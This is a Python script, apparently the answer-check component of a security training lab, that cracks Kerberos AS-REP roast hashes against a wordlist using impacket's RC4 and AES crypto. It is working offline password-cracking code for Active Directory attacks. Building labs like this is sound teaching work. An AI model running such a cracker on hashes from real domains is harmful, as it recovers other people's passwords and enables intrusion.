#!/usr/bin/env python3
"""Crack an AS-REP hash ($krb5asrep$, john format) against a wordlist.

A dev-side cracker for the lab's own check: a student cracks the roast with john
(`john --format=krb5asrep`) or hashcat on the attack box, both of which handle the AES AS-REP
(etype 17/18) this modern DC emits. This stays self-contained on impacket's RFC 3961 crypto so
the check needs no extra cracker in the image. AES (17/18) and RC4 (23) are both supported.

Usage: crack.py HASHFILE WORDLIST   (HASHFILE holds one `$krb5asrep$<etype>$<salt>$<data>$<mac>`)
"""
import sys
import warnings
from binascii import unhexlify

warnings.filterwarnings("ignore")
from impacket.krb5.crypto import _enctype_table

KEY_USAGE_AS_REP_ENCPART = 3


def main():
    if len(sys.argv) != 3:
        sys.stderr.write(__doc__)
        return 2
    line = open(sys.argv[1]).read().strip()
    parts = line.split('$')
    # ['', 'krb5asrep', '<etype>', '<salt>', '<edata-hex>', '<checksum-hex>']
    if len(parts) < 6 or parts[1] != 'krb5asrep':
        sys.stderr.write('unrecognised hash (want john format: $krb5asrep$<etype>$<salt>$<data>$<mac>)\n')
        return 2
    etype = int(parts[2])
    salt = parts[3].encode()
    ciphertext = unhexlify(parts[4]) + unhexlify(parts[5])
    cipher = _enctype_table[etype]

    with open(sys.argv[2], 'rb') as words:
        for raw in words:
            pw = raw.rstrip(b'\r\n')
            if not pw:
                continue
            key = cipher.string_to_key(pw, salt, None)
            try:
                cipher.decrypt(key, KEY_USAGE_AS_REP_ENCPART, ciphertext)  # verifies the integrity hash
            except Exception:
                continue
            print(pw.decode('utf-8', 'replace'))
            return 0
    sys.stderr.write('not cracked\n')
    return 1


if __name__ == '__main__':
    sys.exit(main())
